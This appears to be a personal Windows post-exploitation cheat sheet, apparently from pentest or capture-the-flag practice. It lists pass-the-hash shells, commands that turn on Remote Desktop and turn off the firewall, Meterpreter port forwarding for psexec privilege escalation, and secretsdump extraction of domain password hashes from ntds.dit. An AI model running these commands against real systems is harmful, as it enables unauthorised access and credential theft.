# Misc windows stuff

```sh
winexe - U jenkins/administrator //xxx.xxx.xxx cmd.exe
pth-winexe -U jenkins/administrator //xxx.xxx.xxx.xxx cmd.exe
```

Enable Remote Desktop:

```sh
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall set service remotedesktop enable
```

Enable Remote assistance:

```sh
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable
```

Disable firewall

```sh
netsh firewall set opmode disable
```

## List alternate data streams

```sh
dir /r
powershell (Get-Content hm.txt -Stream root.txt)
```

## msf meterpreter powershell

You can load powershell in meterpreter

```ssh
meterpreter> load powerhsell 
meterpreter> powershell_shell
```

##  msf meterpreter portfwd

You can port potforward in meterpreter.
This tunnel 445 to your host so you can use psexec for privesc.

```ssh
portfwd add -l 445 -p 445 -r 127.0.0.1
```

Dump secrets from hive

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

Check available chares 

```sh
smbmap -u 'username' -p 'password' -d 'domain' -H xx.xx.xx.xx
```
